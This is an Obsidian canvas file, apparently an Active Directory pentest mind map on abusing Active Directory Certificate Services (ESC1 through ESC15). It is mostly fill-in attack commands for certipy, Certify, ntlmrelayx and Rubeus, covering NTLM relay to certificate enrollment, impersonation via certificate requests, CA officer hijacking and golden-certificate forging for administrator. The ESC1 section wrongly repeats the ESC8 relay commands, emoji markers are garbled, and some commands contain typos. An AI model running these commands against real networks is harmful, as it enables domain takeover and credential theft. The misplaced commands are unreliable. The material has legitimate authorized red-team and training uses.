{
	"nodes":[
		{"id":"5ef2efcfb4d714b0","type":"group","x":-780,"y":-380,"width":2580,"height":7040,"color":"#7806a0","label":"ADCS ABUSE"},
		{"id":"b32a3f5c843c8f71","type":"group","x":-2760,"y":2749,"width":1080,"height":783,"label":"NO CREDENTIALS"},
		{"id":"0241841ff1fac097","type":"group","x":2518,"y":5280,"width":1080,"height":763,"color":"1","label":"GOT DOMAIN ADMIN ACCESS"},
		{"id":"7e75f1e3571aa990","type":"group","x":2518,"y":1600,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"37db19af7351d721","type":"group","x":2480,"y":3840,"width":1080,"height":760,"color":"#324bff","label":"DACL ABUSE"},
		{"id":"d4bf82cb714bdf15","type":"group","x":2518,"y":160,"width":1080,"height":760,"color":"#7806a0","label":"ADCS ABUSE"},
		{"id":"66b251b4112cd3df","type":"text","text":"# Enumeration \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/#theory\n\n\n>[!example] Tools\n>- [certify](https://github.com/GhostPack/Certify)\n>- [certipy](https://github.com/ly4k/Certipy)\n>- [ldeep](https://github.com/franc-pentest/ldeep)\n\n```shell\n# Find vulnerable certificate templates with certipy\nâšª certipy find -u '<user>'@'<domain>' -p '<password>' -dc-ip '<dc_ip>'\nâš« certutil -v -dsTemplate\nðŸ”µ certify.exe find [ /vulnerable]\nâšª ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s '<dc_ip>' templates\n# Get PKI objects information\nâš« certify.exe pkiobjects\n# Display CA information\nâš« certutil -TCAInfo\nâš« certify.exe cas\n```","x":-420,"y":-300,"width":2000,"height":640},
		{"id":"85e1edf8556a947b","type":"text","text":"# Web Enrollment Is Up \n## ESC8\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#web-endpoint-esc8\n\n\n>[!example] Tools\n>- [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [certipy](https://github.com/ly4k/certipy)\n>- [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)\n\n```shell\n# Using ntlmrelayx to conduct the esc8 escalation\nðŸŸ£ ntlmrelayx.py -t http://'<dc_ip>'/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController\n# Request a TGT\nâšª gettgtpkinit.py -pfx-base64 '$(cat cert.b64)' '<domain>'/'<dc_name>'$ '<ccache_file>'\nðŸ”µ Rubeus.exe asktgt /user:'<user>' /certificate:'<base64-certificate>' /ptt\n# using certipy \nâšª certipy relay -target http://'<ip_ca>'\nâšª certipy auth -pfx '<certificate>' -dc-ip '<dc_ip>'\n```","x":-420,"y":400,"width":2000,"height":680},
		{"id":"7a42f2c30c11cda7","type":"text","text":"# Misconfigured Certificate Template\n## ESC1\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#template-allows-san-esc1\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n>- [certify](https://github.com/GhostPack/Certify)\n\n\n```shell\n# Using ntlmrelayx to conduct the esc8 escalation\nðŸŸ£ ntlmrelayx.py -t http://'<dc_ip>'/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController\n# Request a TGT\nâšª gettgtpkinit.py -pfx-base64 '$(cat cert.b64)' '<domain>'/'<dc_name>'$ '<ccache_file>'\nðŸ”µ Rubeus.exe asktgt /user:'<user>' /certificate:'<base64-certificate>' /ptt\n# using certipy \nâšª certipy relay -target http://'<ip_ca>'\nâšª certipy auth -pfx '<certificate>' -dc-ip '<dc_ip>'\n```\n\n---\n## ESC2 \n\n### Check esc3 below\n\n---\n\n## ESC3\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-agent-eku-esc3\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n>- [certify](https://github.com/GhostPack/Certify)\n\n```shell\n# Using certify to conduct the esc3 escalation\nðŸ”µ certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"\nðŸ”µ certify.exe request request /ca:<server>\\<ca-name> /template:<template>  /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]\n# Using certipy to conduct the esc3 escalation\nâšªcertipy req -u '<user>'@'<domain>' -p '<password>' -target '<ca_server>' -template '<vulnerable template name>'  -ca '<ca_name>'\nâšªcertipy req -u '<user>'@'<domain>' -p '<password>' -target '<ca_server>' -template  '<vulnerable template name>'  -ca '<ca_name>' -on-behalf-of '<domain>\\<user>' -pfx '<cert>'\n```\n\n---\n\n## ESC13\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc13-issuance-policiy-with-privileged-group-linked\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n>- [certify](https://github.com/GhostPack/Certify)\n\n```shell\n# Using certify to conduct the esc13 escalation\nðŸ”µ certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"\n# Using certipy to conduct the esc13 escalation\nâšª certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>'  -template '<vulnerable template name>' -ca '<ca_name>'\n```\n\n---\n\n## ESC15\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc15-CVE-2024-49019-arbitrary-application-policy\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n```shell\n# Using certipy to conduct the esc15 escalation # with pull request 228 on certipy's repo\nâšª certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>' -template '<version 1 template with enrolee flag>' -ca '<ca_name>' -upn '<target_user>@<domain>' --application-policies 'Client Authentication'\n# Using certipy to conduct the esc15 escalation # with pull request 228 on certipy's repo\nâšª certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>' -template '<version 1 template with enrolee flag>' -ca '<ca_name>' --application-policies 'Certificate Request Agent'\n\nâšª certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>' -template '<vulnerable template name>' -ca '<ca_name>' -on-behalf-of '<domain>\\<user>' -pfx '<cert>'\n```\n\n","x":-420,"y":1160,"width":2000,"height":2280},
		{"id":"6b131f9bb3946b96","type":"text","text":"# Misconfigured ACL\n## ESC4 (Write privilege over a certificate template)\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n\n```shell\n# using certipy \nâšª certipy template -u '<user>'@'<domain>' -p '<password>' -template '<vuln_template>' -save-old -debug\n# restore template\nâšª certipy template -u '<user>'@'<domain>' -p '<password>' -template '<vuln_template>' -configuration '<template>.json'\n\n```\n\n---\n## ESC7 \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-authority-esc7\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n\n```shell\n# Manage CA\nâšª certipy ca -ca '<ca_name>' -add-officer  '<user>' -username '<user>@<domain>' -password '<password>' -dc-ip '<dc_ip>' -target-ip '<target_ip>'\n# Manage certificate if error, save private key and get issue request\nâšª certipy ca  -ca '<ca_name>' -enable-template '<ecs1_vuln_template>' -username '<user>@<domain>' -password '<password>'\n# Issue request\nâšª certipy  req -username '<user>@<domain>' -password '<password>' -ca '<ca_name>' -template '<vulnerable template name>' -upn '<target_user>'\n# Issue request\nâšª certipy ca -u '<user>@<domain>' -p '<password>' -ca '<ca_name>' -issue-request '<request_id>'\nâšª certipy req -u '<user>@<domain>' -p '<password>'  -ca '<ca_name>' -retreive '<request_id>'\n```\n\n","x":-420,"y":3520,"width":2000,"height":1100},
		{"id":"a85b01e4832f98a9","type":"text","text":"# Vulnerable PKI Object access control\n## ESC5 \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/access-controls#other-objects-esc5\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n\n```shell\n# Golden certificate \nâšª certipy ca -backup -u '<user>@<domain>' -hashes '<hash_nt>' -ca '<ca_name>' -debug -target '<ca_ip>'\n# restore template\nâšª certipy forge -ca-pfx '<adcs>.pfx' -upn 'administrator@<domain>'\n# Vulnerable acl on PKI \n```\n\n","x":-420,"y":4680,"width":2000,"height":540},
		{"id":"581302a77f9d8d08","type":"text","text":"# Misconfigured Certificate Authority\n## ESC6 \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-authority#theory\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n- **Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication\nREAD ESC1**\n--- \n\n## ESC11\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#rpc-endpoint-esc11\n\n\n>[!example] Tools\n>- [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [certipy](https://github.com/ly4k/certipy)\n>- [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)\n\n","x":-420,"y":5280,"width":2000,"height":860},
		{"id":"e62e1ebd8ee8b0bc","type":"file","file":"INTERACTIVE-MAP.canvas","x":-2680,"y":2852,"width":920,"height":600},
		{"id":"6baec6857148ef26","type":"file","file":"ATTACKS/GOT DOMAIN ADMIN ACCESS.canvas","x":2598,"y":5360,"width":920,"height":600,"color":"1"},
		{"id":"7ac5035cb0afc467","type":"file","file":"ATTACKS/PERMISSIONS ABUSE.canvas","x":2560,"y":3920,"width":920,"height":600,"color":"#324bff"},
		{"id":"f30e914a3e647bbf","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":2598,"y":1682,"width":920,"height":600,"color":"6"},
		{"id":"796146c5152f9217","type":"file","file":"ATTACKS/ADCS ABUSE.canvas","x":2598,"y":238,"width":920,"height":600,"color":"#7806a0"}
	],
	"edges":[
		{"id":"1e8ca28c4b2caad0","fromNode":"b32a3f5c843c8f71","fromSide":"right","toNode":"5ef2efcfb4d714b0","toSide":"left"},
		{"id":"7dcd2d2489c15053","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"f30e914a3e647bbf","toSide":"left","color":"6"},
		{"id":"5341d289f804fddd","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"6baec6857148ef26","toSide":"left","color":"1"},
		{"id":"48aab21cf4fc2dea","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"7ac5035cb0afc467","toSide":"left","color":"#324bff"},
		{"id":"c4a180a7bcc526cf","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"796146c5152f9217","toSide":"left","color":"#7806a0"}
	]
}